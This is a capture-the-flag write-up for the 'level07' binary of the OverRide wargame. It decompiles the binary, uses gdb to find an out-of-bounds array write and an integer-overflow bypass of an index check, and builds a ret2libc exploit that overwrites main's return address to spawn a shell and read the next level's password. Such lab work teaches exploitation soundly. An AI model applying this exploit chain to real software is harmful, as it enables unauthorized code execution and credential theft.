## Step 1: Static & Dynamic Analysis
```c
080485e7    int32_t get_unum()
080485e7    {
080485e7        int32_t result = 0;
080485fc        fflush(stdout);
08048610        __isoc99_scanf("%u", &result);
08048615        clear_stdin();
0804861e        return result;
080485e7    }

08048630    int32_t store_number(int32_t arg1)
08048630    {
08048630        int32_t var_14 = 0;
0804863d        int32_t var_10 = 0;
0804864c        printf(" Number: ");
08048651        int32_t num = get_unum();
08048661        printf(" Index: ");
08048666        int32_t index = get_unum();
08048666        
08048695        if (index % 3 && num >> 24 != 0xb7)
08048695        {
080486ce            *(uint32_t*)((index << 2) + arg1) = num;
080486d0            return 0;
08048695        }
08048695        
0804869e        puts(" *** ERROR! ***");
080486aa        puts("   This index is reserved for wi…");
080486b6        puts(" *** ERROR! ***");
080486bb        return 1;
08048630    }

080486d7    int32_t read_number(int32_t arr)
080486d7    {
080486d7        int32_t var_10 = 0;
080486ec        printf(" Index: ");
080486f1        int32_t num = get_unum();
08048717        printf(" Number at data[%u] is %u\n", num, *(uint32_t*)((num << 2) + arr));
08048722        return 0;
080486d7    }

08048723    int32_t main(int32_t argc, char** argv, char** envp)
08048723    {
08048723        char** argv_1 = argv;
0804873c        char** envp_1 = envp;
08048740        void* gsbase;
08048740        int32_t eax_2 = *(uint32_t*)((char*)gsbase + 0x14);
0804874f        int32_t s;
0804874f        __builtin_memset(&s, 0, 0x18);
080487a3        void var_1bc;
080487a3        __builtin_memset(&var_1bc, 0, 0x190);
080487f2        int32_t var_1dc;
080487f2        size_t fp;
080487f2        
080487f2        while (*(uint32_t*)argv_1)
080487f2        {
080487f2            int32_t i = 0xffffffff;
080487c0            char* edi_1 = *(uint32_t*)argv_1;
080487c0            
080487c2            while (i)
080487c2            {
080487c2                bool cond:0_1 = 0 != *(uint8_t*)edi_1;
080487c2                edi_1 = &edi_1[1];
080487c2                i -= 1;
080487c2                
080487c2                if (!cond:0_1)
080487c2                    break;
080487c2            }
080487c2            
080487d1            fp = ~i - 1;
080487d5            var_1dc = 0;
080487e0            memset(*(uint32_t*)argv_1, var_1dc, fp);
080487e5            argv_1 = &argv_1[1];
080487f2        }
080487f2        
08048841        while (*(uint32_t*)envp_1)
08048841        {
08048841            int32_t i_1 = 0xffffffff;
0804880f            char* edi_2 = *(uint32_t*)envp_1;
0804880f            
08048811            while (i_1)
08048811            {
08048811                bool cond:1_1 = 0 != *(uint8_t*)edi_2;
08048811                edi_2 = &edi_2[1];
08048811                i_1 -= 1;
08048811                
08048811                if (!cond:1_1)
08048811                    break;
08048811            }
08048811            
08048820            fp = ~i_1 - 1;
08048824            var_1dc = 0;
0804882f            memset(*(uint32_t*)envp_1, var_1dc, fp);
08048834            envp_1 = &envp_1[1];
08048841        }
0804884a        puts("--------------------------------…");
0804884a        
08048857        while (true)
08048857        {
08048857            printf("Input command: ", var_1dc, fp);
0804885c            int32_t var_2c_1 = 1;
0804886c            fp = stdin;
08048882            int32_t var_28;
08048882            fgets(&var_28, 0x14, fp);
0804889d            int32_t i_2 = 0xffffffff;
080488a1            int32_t* edi_3 = &var_28;
080488a1            
080488a3            while (i_2)
080488a3            {
080488a3                bool cond:6_1 = 0 != *(uint8_t*)edi_3;
080488a3                edi_3 += 1;
080488a3                i_2 -= 1;
080488a3                
080488a3                if (!cond:6_1)
080488a3                    break;
080488a3            }
080488a3            
080488ac            bool c_1 = ~i_2 - 1 < 1;
080488ac            bool z_1 = ~i_2 == 2;
080488af            *(uint8_t*)(&var_28 + ~i_2 - 2) = 0;
080488c5            int32_t i_3 = 5;
080488ca            int32_t* esi_1 = &var_28;
080488cc            char const* const edi_4 = "store";
080488cc            
080488ce            while (i_3)
080488ce            {
080488ce                char temp1_1 = *(uint8_t*)esi_1;
080488ce                char const temp2_1 = *(uint8_t*)edi_4;
080488ce                c_1 = temp1_1 < temp2_1;
080488ce                z_1 = temp1_1 == temp2_1;
080488ce                esi_1 += 1;
080488ce                edi_4 = &edi_4[1];
080488ce                i_3 -= 1;
080488ce                
080488ce                if (!z_1)
080488ce                    break;
080488ce            }
080488ce            
080488df            bool c_2 = false;
080488df            bool z_2 = !(int32_t)((!z_1 && !c_1) - c_1);
080488df            
080488e1            if (!z_2)
080488e1            {
08048906                int32_t i_4 = 4;
0804890b                int32_t* esi_2 = &var_28;
0804890d                char const* const edi_5 = "read";
0804890d                
0804890f                while (i_4)
0804890f                {
0804890d                
0804890f                while (i_4)
0804890f                {
0804890f                    char temp3_1 = *(uint8_t*)esi_2;
0804890f                    char const temp4_1 = *(uint8_t*)edi_5;
0804890f                    c_2 = temp3_1 < temp4_1;
0804890f                    z_2 = temp3_1 == temp4_1;
0804890f                    esi_2 += 1;
0804890f                    edi_5 = &edi_5[1];
0804890f                    i_4 -= 1;
0804890f                    
0804890f                    if (!z_2)
0804890f                        break;
0804890f                }
0804890f                
08048920                bool c_3 = false;
08048920                bool z_3 = !(int32_t)((!z_2 && !c_2) - c_2);
08048920                
08048922                if (!z_3)
08048922                {
08048947                    int32_t i_5 = 4;
0804894c                    int32_t* esi_3 = &var_28;
0804894e                    char const* const edi_6 = "quit";
0804894e                    
08048950                    while (i_5)
08048950                    {
08048950                        char temp5_1 = *(uint8_t*)esi_3;
08048950                        char const temp6_1 = *(uint8_t*)edi_6;
08048950                        c_3 = temp5_1 < temp6_1;
08048950                        z_3 = temp5_1 == temp6_1;
08048950                        esi_3 += 1;
08048950                        edi_6 = &edi_6[1];
08048950                        i_5 -= 1;
08048950                        if (!z_3)
08048950                            break;
08048950                    }
08048950                    
08048963                    if (!(int32_t)((!z_3 && !c_3) - c_3))
08048963                    {
080489e3                        if (eax_2 == *(uint32_t*)((char*)gsbase + 0x14))
080489f1                            return 0;
080489f1                        
080489e5                        __stack_chk_fail();
080489e5                        /* no return */
08048963                    }
08048922                }
08048922                else
08048922                {
0804892b                    read_number(&var_1bc);
08048930                    var_2c_1 = 0;
08048922                }
080488e1            }
080488e1            else
080488ef                var_2c_1 = store_number(&var_1bc);
080488ef            
0804896d            if (!var_2c_1)
0804896d            {
08048995                var_1dc = &var_28;
0804899c                printf(" Completed %s command successful…", var_1dc);
0804896d            }
0804896d            else
0804896d            {
0804897b                var_1dc = &var_28;
08048982                printf(" Failed to do %s command\n", var_1dc);
0804896d            }
0804896d            
080489a8            __builtin_memset(&var_28, 0, 0x14);
08048857        }
08048723    }
```

### Explanation
```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 1337
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 1337
 Completed read command successfully
Input command: quit
level07@OverRide:~$
```

This binary begin by cleaning with `memset()` all data stored in `argv` and `envp`.

Then the binary waits for user input in an infinite loop, accepting three different commands: `read`, `write` and `quit`.
  
In the `main` function, a `400 bytes` array is created on the stack and initialized with zeros.
The `store_number()` function allows us to select a number and an associated index to store it in the array.
However, there's a vulnerability in the index check:

```c
if (index % 3 && num >> 24 != 0xb7)
```

The vulnerability is that a value can be written outside the `400 bytes` array if the specified index is not divisible by 3.

As we cannot redirect the execution to a shellcode (stored in argv or envp), we will try a ret2libc attack.

First steps is to find address of the array.

```
Input command: store
 Number: 1111111111
 Index: 1

Breakpoint 3, 0x080486d5 in store_number ()
(gdb) x/110wx $esp
0xffffda10:     0x08048add      0xffffda64      0x00000000      0xf7e2b6c0
0xffffda20:     0xffffdc28      0xf7ff0a50      0x423a35c7      0x00000001
0xffffda30:     0x00000000      0xffffdfdc      0xffffdc28      0x080488ef
0xffffda40:     0xffffda64      0x00000014      0xf7fcfac0      0xf7fdc714
0xffffda50:     0x00000098      0xffffffff      0xffffdd1c      0xffffdcc8
0xffffda60:     0x00000000      0x00000000      0x423a35c7      0x00000000
0xffffda70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffda80:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffda90:     0x00000000      0x00000000      0x00000000      0x00000000
```

The stored value (`0x423a35c7`) appears at address `0xffffda68`.
Since we stored it at index 1, the base address of our array is `0xffffda64`.

Next, we determine the index required to reach the return address in main.

```
(gdb) x/wx $esp  
0xffffdc2c:     0xf7e45513
```

We set a breakpoint before `ret` instruction and inspect the top of the stack, the return address is at `0xffffdc2c`.

```python
>>> (0xffffdc2c - 0xffffda64) / 4    
114.0
>>> 114 % 3
0
```

However, the check `index % 3` prevents us from using 114.
To bypass this, we exploit an integer overflow `((uint32_t max value / 4) + value)`.

```python
>>> (4294967296 / 4) + 114
1073741938.0
>>> 1073741938 % 3
1
```

```
Input command: store
 Number: 1337
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 1337
 Completed read command successfully
```

We are now able to overwrite the main return address.

Let's find the last addresses neened.

```
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```

```python
>>> 0xf7e6aed0
4159090384
```

```
(gdb) info proc map
process 1852
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fda000 0xf7fdb000     0x1000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec
1 pattern found.
```

```python
>>> 0xf7f897ec
4160264172
```

## Step 2: Exploiting the Binary

```
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
% cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
%
```